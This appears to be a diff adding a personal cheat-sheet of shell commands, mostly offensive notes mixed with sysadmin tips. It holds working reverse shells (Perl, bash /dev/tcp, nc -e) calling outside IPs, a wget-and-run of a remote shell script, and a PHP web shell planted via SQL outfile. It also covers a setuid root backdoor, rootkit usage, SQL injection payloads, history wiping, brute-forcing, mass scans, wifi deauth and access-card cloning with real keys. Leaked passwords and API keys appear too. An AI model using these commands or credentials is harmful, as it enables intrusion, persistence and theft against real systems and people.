@@ -1,0 +1,706 @@
+auto eth0
+
+  iface lo inet loopback
+
+  iface eth0 inet static  
+  address 192.168.1.11
+  netmask 255.255.255.0  
+  gateway 192.168.1.1
+
+#apt 
+apt-get install --only-upgrade
+apt list --upgradable / apt-get -u upgrade --assume-no
+apt-mark hold exploitdb # marcar para no actualizar
+
+#Root exploits comprobados
+Apport Linux Local Root >> https://www.exploit-db.com/exploits/36746/
+
+#Enviar el history a dev/null
+export HISTFILE="/dev/null"
+
+#Tunel para pasar archivos con netcat
+#################################################
+en la makina cliente
+nc -l -p 6868 > m
+y en la makina servidor
+nc 217.127.135.156 6868 < m
+
+bomba f0rk
+:(){ :|:& };:
+
+--------------------------------------------------
+cambiar mac
+ifconfig {eth0|wlan0} hw ether CA:CA:CA:CA:CA:CA
+--------------------------------------------------
+----------------------------------------------------
+Router 3com
+#####################################################
+add nat tcp vc internet public_port 2122 private_port 6667 private_address 210.205.6.92
+enable ip wan_to_wan_forwarding
+save all
+reboot
+---------------------------------------------------
+Limpiando logs
+###################
+awk '{ print $1 $2 }' archivo > salida
+uniq >> busca lineas iguales y limpia el log
+sed (sustituye "@" por un espacio en blanco) -> cat archivo | sed y/\@/\ / > salida
+sort -nr archivo > salida 
+sed "a\CADENAAA" file.txt #añadir cadena despues de cada linea
+
+Archivos setuideados...
+find / -perm -+s
+find / \( -perm -4000 -o -perm -2000 \) -type f -exec ls -la {} \;
+find / -user root -perm -4000 -print 2>/dev/null  ##Cool , look at nmap
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+
+#ataque diseccionado
+grep -i "19/Aug/2015" /var/log/apache2/* > /root/19aug.txt
+cat 19aug.txt | awk '{print $1}'|sort -r |uniq |more
+
+#clave wp md5 -> $P$B8B5W/u5Gwktte84i4e5xNPGoBqj0x1 // 950141318NnN
+
+# html5 telefono : <a href="tel:950084081">950 08 40 81</a>
+# enlace : <a href="#">anchor</a>
+
+#awk
+awk 'NR >= 877 && NR <= 1082' --> selecion entre numero de lineas
+
+#Mavericks dock transparente
+ON : defaults write com.apple.dock hide-mirror -bool true;killall Dock
+OFF : defaults write com.apple.dock hide-mirror -bool false;killall Dock
+
+#Certificados
+/opt/letsencrypt/./letsencrypt-auto --apache
+./letsencrypt-auto --apache -d hospital.softwarepy.me -d www.hospital.softwarepy.me
+./letsencrypt-auto renew --agree-tos
+certbot --apache -d demo.softwarepy.com
+certbot renew
+./certbot-auto --no-self-upgrade --apache -d tuparejarusa.com -d www.tuparejarusa.com
+
+
+#macs
+6C:40:08:A8:F2:FC - macbook
+5C:A3:9D:48:33:2A - samsung tv
+D0:22:BE:BB:DD:14 - note3
+84:38:38:9A:1B:E3 - s5
+
+#wpdb
+create database hashdb;
+create user hash identified by '20449dxDVVDajajR4';
+grant all privileges on hashdb.* to hash;
+
+#migration db
+UPDATE wp_options SET option_value = REPLACE ( option_value, 'http://www.reulalto.com', 'http://en.reulalto.com' );
+UPDATE wp_posts SET guid = REPLACE ( guid, 'http://www.reulalto.com', 'http://en.reulalto.com' );
+UPDATE wp_posts SET post_content = REPLACE ( post_content, 'http://www.reulalto.com', 'http://en.reulalto.com' );
+UPDATE wp_postmeta SET meta_value = REPLACE ( meta_value, 'http://www.reulalto.com', 'http://en.reulalto.com' );
+
+
+#logstalgia
+ssh diego@almeritek.com -p 4455 "tail -f /var/log/apache2/almeritek.com access.log" | logstalgia -x —sync
+ssh diego@almeritek.com -p 4455 'cat /var/log/apache2/almeritek.com.access.log' | goaccess -a > al.html
+
+#comprimir jpg y png
+jpegoptim --max=80 --strip-all *
+jpegoptim --max=80 --strip-all `find . -name *.jpg`
+optipng -o5 *.png
+
+#clonesite
+httrack --mirror -bN -sN http://codeytech.com/site-templates/applify/ -O applify
+
+#buscar una linea
+find . -type f -exec grep -inH "^[^*/#]*passw?o?r?d?" {} \;
+find . -type f -exec grep -inH "richard" {} \;
+find . -type f -exec grep -inH "<\!" {} \; ## escupe comentarios
+
+
+#banear ip
+iptables -I INPUT -s 37.187.119.117 -j DROP
+
+#PS1
+mac - PS1='\[\033[1;34m\]\[\033[0;34m\]\h\[\033[1;34m\]:\[\033[0;34m\]\W \[\033[1;34m\]\u\[\033[1;34m\]\[\033[0m\]$ '
+
+#Generate RSA pair
+#macos
+ssh-keygen
+eval `ssh-agent`
+ssh-add -k ~/.ssh/bit_rsa
+
+
+#WAN ip linux
+dig +short myip.opendns.com @resolver1.opendns.com
+
+#g0 t0 sh3LL
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+#buscapass
+!full find / -type f | xargs grep -i ".*\(PSW\|pass\|pwd\).* \?\(=\|:\)\{1\} \?\"\?\'\?.\{5,\}\?\"\?\'\?" /* >> /tmp/salida.txt &
+
+#inurlbr
+ ./inurlbr.php --dork 'inurl:tu_dork' -s texto_output.txt -q all --command-all "php tu_exploit.php -t '_TARGET_'"
+#loop
+while true; do id;done
+#for
+for i in `cat ips`;do hydra -l admin -p admin -e ns -f -V $i http-get /;done
+
+#masscan
+sudo masscan 217.217.0.0/8 -p21 --banners -oX scan.xml --max-rate 100000
+#sed
+sed 's/6/http:\/\//'|sed 's/,/ /'						
+
+#online reverse shell perl
+perl -e 'use Socket;$i="94.242.246.20";$p=7788;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+#scp
+scp Python-2.7.10.tgz john@360.conti-b2b.cn:/usr/share/jvms/
+
+#tunel dmz
+ssh -L 0.0.0.0:9000:192.168.1.152:3389 john@360.conti-b2b.cn -v -v
+
+#simple servidor web python http server
+python -m SimpleHTTPServer
+
+#busca
+find / -type f | xargs grep -i ".*\(PSW\|pass\|pwd\).* \?\(=\|:\)\{1\} \?\"\?\'\?.\{5,\}\?\"\?\'\?" /* >> salida.txt &
+
+#for
+for i in {1..254};do ./onesixtyone 192.168.1.$i; done
+
+#Bonesi
+bonesi -i 50k-bots -p tcp -r 0 -u http://192.168.1.107 -d eth0 -v 192.168.1.107:80
+
+#find suitable setuid files
+find / -perm -4000 -type f 2>/dev/null
+ls -alt `find / -perm -4000 -type f 2>/dev/null`  ##GREAT##
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+#mysql
+#usar db : use mydb;
+#mostrar todas las tablas de la db: show full tables from mydb;
+#mostrar datos de una tabla : select * from tabla_db;
+#eliminar contenido que cumpla una condicion: DELETE FROM tabla WHERE id = '1';
+
+#SQLMAP
+
+/* PRIMER */
+#1 sqlmap -r primer -v1  --current-user --is-dba --current-db --hostname
+#####2 sqlmap -r primer --file-read=/etc/passwd --threads=10
+#3 sqlmap -r primer -v1 --users --passwords --privileges --roles
+#4 sqlmap -r primer -D test -T users -C username.password --dump
+
+sqlmap -u "http://192.168.1.139/?p=" --level=5 -v 3
+
+sqlmap -r burp --dbs
+sqlmap -r burp --current-user --is-dba --current-db --hostname --threads=10
+sqlmap -r burp --users --passwords --privileges --roles --threads=10
+sqlmap -r primer --file-read=/etc/passwd --threads=10
+sqlmap -r burp --sql-shell
+sqlmap -r burp --os-shell
+sqlmap -u "http://192.168.1.107/sqli-labs/Less-1/?id=5" --dbs
+sqlmap -u "http://192.168.1.107/sqli-labs/Less-1/?id=5" --password
+sqlmap -u "http://192.168.1.107/sqli-labs/Less-1/?id=5" -D security --tables
+sqlmap -u "http://192.168.1.107/sqli-labs/Less-1/?id=5" -D security -T users --columns
+sqlmap -u "http://192.168.1.107/sqli-labs/Less-1/?id=5" -D security -T users --dump
+sqlmap -r burp -D sqldummywebsite -T user_info -C user_password --dump
+sqlmap -r burp --data='user=whatthebobby&pass=propane1' --os-shell
+sqlmap -r burp -o -b --current-user --is-dba
+sqlmap -r burp -v1 --current-user --password
+sqlmap -r burp --os=Linux --level=5 --risk=3 --banner --is-dba --dbs --tables --technique=BEUST
+
+#Nmap
+nmap -sS -sV -PN paula.agrucapers.com -oN nmap-log.txt
+nmap 192.168.1.113 -p-
+nmap --script all -sV -O 5.34.149.3 -p 1-65535
+nmap 192.168.1.136 -T5 -p- -oN nmap.log
+nmap 192.168.1.135 -p 139 -sV -n -A
+nmap -p80 192.168.1.137 -oG - | nikto -h -
+
+nmap 192.168.1.132 -Pn -p- -sV -oN nmap.txt ## cool for ctf
+nmap -p 1-65535 -T5 -A -v -sT 192.168.1.130
+
+#Nikto
+nikto -h 192.168.1.110 -output nikto-log.txt
+
+#WFUZZ
+python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://192.168.1.117/Panel/FUZZ
+
+#simple cmd.php; curl http://ip/shell.php?cmd=id;curl http://192.168.1.113/dev/upload/shell.pht -d "cmd=uname -a"
+<?php  
+ if(isset($_REQUEST['cmd'])){  
+   $cmd = ($_REQUEST["cmd"]);  
+   system($cmd);  
+   echo "</pre>$cmd<pre>";  
+   die;}  
+ ?>  
+
+#SCP
+get ## scp jason@172.16.119.138:tfc ./
+put ## scp tfc root@192.168.1.106:/tmp/
+
+#GIT
+git remote add origin git@github.com:Almeritek/OSCP.git
+git add README.md
+git add .
+git commit -m "iniciando..."
+git push -u origin master
+
+#update all github
+ls | xargs -I{} git -C {} pull
+
+############################################
+#Tortazo
+python Tortazo.py -n 35 -v -m linux -c
+
+#lsof
+lsof -Pnl +M -i4
+
+###
+{"username":"'; delete from users;-- -","method":"list"}
+####
+{"username":"' UNION ALL select concat_ws(',',table_name, column_name, data_type, character_maximum_length) from INFORMATION_SCHEMA.COLUMNS-- -","method":"list"}
+
+
+#CSS TRANSPARENTE
+rgba(221, 51, 51, 0)
+
+#wpscan
+--connect-timeout 20 --request-timeout 20
+wpscan --stealthy --url http://10.10.10.120/wp/wordpress/ --enumerate
+
+#SIPI ip information
+python sipi.py 104.24.127.159  -A -s -i -d4
+
+#hydra
+hydra -v -V -F -L users.txt -P rockyou.txt -t 30 ftp://192.168.1.135
+hydra -t 5 -V -f -L users.txt -P common.txt 192.168.1.135 ssh
+hydra -t 5 -V -f -L users.txt -e ns -P pasess.txt 192.168.1.135 mysql
+hydra -L usernames.txt -P /root/pax/mierdas-de-pax0rs/rockyou.txt -s 80 -f 192.168.1.135 http-get /sev-home #simple auth login
+
+#SAMBA
+enum4linux
+smbclient -N -L \\192.168.1.135
+
+#WEB ENUMERATION
+curl -k -I 192.168.1.136:12380
+amap 192.168.1.136 12380
+dirb https://192.168.1.136:12380 -r
+./gobuster -w ../SecLists/Discovery/Web_Content/common.txt -u 192.168.1.135
+
+#Fondo transparente
+rgba(221, 51, 51, 0)
+
+# inyectando shell en sql
+
+cat shell.php | xxd -ps | tr -d '\n'
+
+3c3f70687020200a20696628697373657428245f524551554553545b27636d64275d29297b20200a20202024636d64203d2028245f524551554553545b22636d64225d293b20200a20202073797374656d2824636d64293b20200a2020206563686f20223c2f7072653e24636d643c7072653e223b20200a2020206469653b7d20200a203f3e0a
+
+select 0x3c3f70687020200a20696628697373657428245f524551554553545b27636d64275d29297b20200a20202024636d64203d2028245f524551554553545b22636d64225d293b20200a20202073797374656d2824636d64293b20200a2020206563686f20223c2f7072653e24636d643c7072653e223b20200a2020206469653b7d20200a203f3e0a into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+
+########################################## recordar añadir 0x #################
+#####
+Metasploit webshell#
+####################
+msfvenom -p php/meterpreter/reverse_tcp -f raw --platform php -e generic/none -a php \> LHOST=192.168.1.134 LPORT=443 -o webshell.php
+
+msfconsole
+use multi/handler
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST 192.168.1.134
+set LPORT 443 
+run 
+####################
+
+#añadir usuario bash (pass: lala)
+useradd -p sad5VMXTyldQk diego
+########################################
+
+
+#!/bin/bash
+#sushi
+
+cat << EOF > sushi.c
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+  int main(void)
+ {
+
+    uid_t uid, euid;
+    uid = getuid();
+    euid = geteuid();
+ 
+    setreuid(euid, euid);
+    system("/bin/bash");
+
+    return 0;
+
+ }
+EOF
+
+gcc sushi.c -o /bin/sushi
+chown root /bin/sushi
+chmod a+rx /bin/sushi
+chmod u+s /bin/sushi
+rm -rf sushi.c
+##########################
+###reverse shell php######
+php-reverse-shell.php
+http://192.168.1.134/php-reverse-shell.txt%3F.jpg
+<? system('id'); ?>
+
+
+#Reverse shell bash
+echo 'bash -i >& /dev/tcp/192.168.1.132/7788 0>&1' | bash
+#####
+Buscar host en una red sin nmap
+####
+for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep 'from'; done
+####
+###Grabar imagen en SD##
+sudo dd if=kali-2.0.1-rpi2.img of=/dev/mmcblk1 bs=512k
+
+#donde puedo escribir
+find / -writable -type d 2>/dev/null  
+
+#buscar por fecha
+find . -type f -ls |grep '2017'
+
+#obtener valor numerico permisos tipo rw-wrr-xx
+stat -c %a file
+
+#rshell
+nc -e /bin/sh 192.168.1.132 1337
+wget http://telis.edugraf.ufsc.br/apliques/2007/1/bertoldi/rshell.pl -O r.pl;perl r.pl 192.168.1.135 7788;rm -rf r.pl
+
+#iterm2 download shell integration , add to .profile >> 
+# export iterm2_hostname=`/sbin/ifconfig eth0| grep "inet addr" | awk -F: '{print $2}' | awk '{print $1}';` 
+
+
+######## r00t check bash ########
+#!/usr/bin/env bash
+
+if [[ $EUID -eq 0 ]]; then
+  echo "::: You are root! :::"
+else
+  echo "::: Run this shit as root. :::"
+    exit 1
+
+fi
+############################
+
+
+##Super shell##
+ncat -l 4455 -e /bin/sh -v // ncat ip 4455
+python -c 'import pty;pty.spawn("/bin/bash")'
+*Presionamos CTRL+Z para enviar el netcat a segundo plano.
+# stty raw -echo
+# fg 
+# reset
+Terminal type? xterm-256color
+bash-4.3$ mkdir /tmp/.home
+bash-4.3$ export HOME=/tmp/.home
+bash-4.3$ /bin/bash
+
+#Torguard RPI3
+openvpn --daemon --cd /etc/openvpn --config TorGuard.Canada.Toronto.ovpn
+
+#Listar archivos modificados las ultimas 24h
+find . -type f -mtime -1 -exec ls -gGh --full-time '{}' \; | cut -d ' ' -f 4,5,7 |sort
+
+#struts + inurlbr
+php5 inurlbr.php --dork 'filetype:action' -s rce_apache.txt -q all --command-all --unique "python jexboss.py -u '_TARGET_' --struts2"
+
+#####
+Divi Api Key
+32810e20dc730f9167c9893287062cf60d5e6e1d
+Map Extended Module
+dwd593dd9d784e78
+
+#Especificar cache del navegador en .htaccess
+<IfModule mod_expires.c>
+ExpiresActive On
+ExpiresDefault "access plus 10 days"
+ExpiresByType text/css "access plus 1 week"
+ExpiresByType text/plain "access plus 1 week"
+ExpiresByType image/gif "access plus 1 month"
+ExpiresByType image/png "access plus 1 month"
+ExpiresByType image/jpeg "access plus 1 month"
+ExpiresByType image/x-icon "access plus 3 months"
+ExpiresByType application/x-javascript "access plus 1 month"
+ExpiresByType application/javascript "access plus 1 week"
+ExpiresByType text/javascript "access plus 1 week"
+ExpiresByType application/x-icon "access plus 3 months"
+</IfModule>
+# FIN
+
+#### Auto Updates Wordpress ###
+en wp-config.php
+
+add_filter( 'auto_update_plugin', '__return_true' );
+add_filter( 'auto_update_theme', '__return_true' );
+
+
+# Optimizar directorio recursivo con jpgoptim
+jpegoptim --max=60 --strip-all `find . -name "*.jpg"`
+
+# importar y exportar base de datos mysql
+
+importar :
+mysql –u py -p demopydb < demopydb.sql
+
+exportar :
+mysqldump –u py -p demopydb.sql > fichero_exportación.sql
+
+#torguard
+HUt0pbHt
+
+# cmd dork search 
+intext:"uid=33(www-data) gid=33(www-data) groups=33(www-data)" intext:"safemode off"
+
+# ATSCAN examples
+perl atscan.pl -d "index of" -l 10 --m-random ##Random Engine
+perl atscan.pl -d "dork" -l 10 --b-random -s output.txt ##Random Browser
+
+# Curl parse espaces with data-urlencode
+change this -> curl http://192.168.1.134/cgi-bin/tracertool.cgi?ip=;ls -al
+for this -> curl -G "http://192.168.1.134/cgi-bin/tracertool.cgi" --data-urlencode "ip=;ls -al"
+
+# Bruteforce WPscan
+wpscan --url 192.168.1.134/backup_wordpress/ --wordlist /root/writeups/besides-vancouver/common_roots.txt --username john
+wpscan --url 192.168.1.134/backup_wordpress/ --wordlist /root/writeups/besides-vancouver/common_roots.txt --username admin
+
+# Bruteforce hydra
+hydra -l anne -P rockyou.txt 192.168.1.134 -t 4 ssh
+
+# Find buscar por usuario
+find / -user vivek 2>/dev/null
+
+# Romper md5 con diccionario
+hashcat –m 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# nmap con setuid
+nmap --interactive # tambien vale nmap -V
+!sh
+
+# netstat 
+netstat -putan
+netstat -ln
+
+# RDP bloqueado google cloud, abrir remote desktop con /admin
+mstsc /admin
+
+# PortKnock 
+for i in {1..65535};do nmap -PN --host_timeout 201 --max-retries 0  -p $i 192.168.1.113;done|grep open
+
+# tcpdump 
+tcpdump -i eth0 -nev udp port 68 # capturar dhcp
+tcpdump -nvvX -s0 -i eth0 tcp portrange 22 # capturar trafico tcp 22
+
+# binwalk
+binwalk --dd='.*' frequency.mp3 # extraer todos los archivos
+
+# Cual es mi ip
+curl ipecho.net/plain; echo
+curl icanhazip.com
+curl ifconfig.me
+
+#eliminar ansi color
+sed 's/\x1b\[[0-9;]*m//g'
+
+#masscan
+masscan 109.0.0.0/8 --rate 10000 -p5984 -oG couches.txt
+
+#netcat 
+nc -v -z -w 3 81.45.159.87 4070 &> /dev/null && echo "Online" || echo "Offline"
+
+#telnet
+timeout --signal=9 2 telnet 81.23.75.239 4050 # cierra sesion en 2 segundos si no hay respuesta
+
+#zcat
+zcat pax0r.com.access.log.*.gz|grep ' 200 ' |grep '\.php' |grep -v 'cron\.php' |grep -v 'wordfence' |less
+
+#escape rbash 
+#with vim
+first) :set shell=/bin/bash
+second) :shell
+#with awk
+awk 'BEGIN {system("/bin/bash")}'
+
+# List of users
+cat /etc/passwd | cut -d: -f1
+cat /etc/passwd |grep -i sh | cut -d: -f1
+
+#Advanced Linux File Permission
+find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
+for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null 
+
+# pide un argumento en bash
+#!/bin/bash
+
+if [ $# -ne 1 ]; then
+  echo "[+] Usa $0 lista.txt"
+else
+###############################
+
+#cewl 
+cewl -w log -m 7 -d 1 http://www.website.com
+
+#access.log
+awk '{print $1}' access.log | sort | uniq -c | sort -nr |head #find top 10 ips
+grep -i "18/Jul/2018" * | awk '{print $1}' | sort | uniq -c | sort -nr |head #top 10 de ips en un dia concreto
+awk '($9 ~ /404/)' *access.log* | awk '{print $9,$7}' | sort |uniq #Get all 404 requests
+
+#info Linux S.O
+cat /etc/*-release
+
+#Diamorphine LKM
+  insmod diamorphine.ko
+  kill -n 63 $$ # hace invisible el modulo
+  kill -n 63 0 # hace visible el modulo
+  rmmod modulename # desinstala modulo
+  kill -n 64 $$ # te da root
+  kill -n 31 pid # hace invisible el proceso
+  # edita diamorphine.h para ajustar variables
+  mkdir magicprefix_directorio # directorio invible
+  touch magicprefix_file # archivo invisible
+
+# dumpear proceso ssh con el pid del cliente
+strace -ff -e trace=write -e write=1,2 -p PID
+  
+#bashrc
+AZUL
+PS1='\[\033[1;34m\][\[\033[0;34m\]\u\[\033[1;34m\]@\[\033[0;34m\]\h \[\033[1;34m\]\W\[\033[1;34m\]]\[\033[0m\]# '
+ROJO
+PS1='\[\033[1;31m\][\[\033[0;31m\]\u\[\033[1;31m\]@\[\033[0;31m\]\h \[\033[1;31m\]\W\[\033[1;31m\]]\[\033[0m\]# '
+
+#NTFS
+showmount -e 192.168.1.135
+mount -t nfs 192.168.1.135:/home/user/storage share/
+nmap -sC -p111 192.168.1.136
+
+#DASH BUTTON
+kitkat MAC - 78:E1:03:22:9F:50
+
+#ESP8266 Wemos oled
+esptool -p /dev/ttyUSB0 write_flash -fm dio -fs 32m 0x00000 deauther_2.1.0_DSTIKE_OLED_v2_v2.5_v3.bin
+esptool -p /dev/ttyUSB0 --baud 115200 read_flash 0x00000 0x400000 backup.img
+
+#php://filter for local file inclusion
+http://192.168.1.132/?lang=php://filter/convert.base64-encode/resource=index
+
+#mifare
+pcsc_scan / nfc-list
+LD_LIBRARY_PATH=/root/builds/nfc/prefix/lib
+/root/builds/nfc/prefix/bin/mfcuk -C -R 0:A -s 250 -S 250 -v 3
+mfoc -O ego.dmp -k a0a1a2a3a4a5
+mifare-classic-format
+nfc-mfclassic w b tarjetabus.dmp blank.dmp
+
+#mifare keys
+tamarabus - KEY: 0172066b2f03
+eGo gym - KEY: a0a1a2a3a4a5
+
+#hex to string - string to hex
+echo 00 4d 41 54 45 4f 53 20 | xxd -r -p << hex to string
+echo -n "Hello" | od -A n -t x1 << string to hex
+:%!xxd <<< vim hex editor
+
+#dnie
+opensc-tool -a
+opensc-tool -n
+opensc-tool -na
+opensc-tool -na --serial
+opensc-tool --list-readers
+opensc-tool --reader 0 --atr
+opensc-tool --reader 0 --name
+
+#Raspberry pi 3 kali linux bluetooth
+systemctl enable hciuart
+systemctl start bluetooth
+bluetoothctl
+[bluetooth]# agent on
+[bluetooth]# scan on
+
+#Cambiar entre versiones de php
+update-alternatives --config php
+service apache2 
+
+#Comprimir GIFS
+gifsicle --batch --optimize=3 <filename>.gif
+
+#wpa2 handshake airodump-ng
+airmon-ng start wlan1
+airodump-ng wlan1 --bssid C0:3F:0E:C2:42:37 -c 6 --write ONO4237
+aireplay-ng --deauth 0 -c B0:A2:E7:56:35:B9 -a A2:4C:5B:F9:BA:27 wlan1
+#WPS
+wash -i wlan1 << mostrar aps con wps
+reaver -i {monitor interface} -b {BSSID of router} -c {router channel} -vvv -K 1 -f
+
+#Proxmark3
+#Mifare
+hf mf mifare # extrae primera clave
+hf mf nested 1 0 A 0172066b2f03 d # extrae otras claves y crea dumpkeys.bin
+hf mf dump # crea dumpdata.bin
+
+hf mf restore # copiar en blank chinese
+
+#indala
+lf search # para leer el id en la tarjeta de origen
+lf em 410x_write 011195DCF9 1 # para escribir el id en la tarjeta destino
+
+#Generate random MAC
+hexdump -n6 -e '/1 ":%02X"' /dev/random|sed s/^://g
+
+#Steghide
+steghide extract -sf irked.jpg
+
+#HASHTOPOLIS
+
+-a 3 #HL# ?a?a?a?a?a?a?a?a?a --force --generate-rules-func-max 12
+
+######################################################
+######################################################
+# flash proxmark3 ####################################
+This method is useful for those looking to run bleeding-edge versions of iceman's client. Keep this in mind when attempting to update your HomeBrew tap formula as this procedure could easily cause a build to break if an update is unstable on macOS.
+
+Tested on macOS High Sierra 10.13.2
+
+Note: This assumes you have already installed iceman's fork from HomeBrew as mentioned above
+
+Force HomeBrew to pull the latest source from github brew upgrade --fetch-HEAD iceman1001/proxmark3/proxmark3
+
+Flash the bootloader & fullimage.elf
+
+With your Proxmark3 unplugged from your machine, press and hold the button on your Proxmark 3 as you plug it into a USB port. Continue to hold the button until after this step is complete and the proxmark3-flasher command outputs "Have a nice day!"* $ sudo proxmark3-flasher /dev/tty.usbmodem881 -b /usr/local/Cellar/proxmark3/HEAD-6a710ef/share/firmware/bootrom.elf /usr/local/Cellar/proxmark3/HEAD-6a710ef/share/firmware/fullimage.elf
+$ sudo proxmark3-flasher /dev/tty.usbmodem881
+
+Enjoy the update
+#######################################################
+#######################################################
+
+
+###
+PROXIE LIST
+###
+curl 'https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=es' -o list.txt 2>/dev/null
+for run in {1..5}
+do
+proxy=`shuf -n 1 list.txt`
+curl -m 2 --verbose --proxy $proxy 'URL'
+done
+########
+
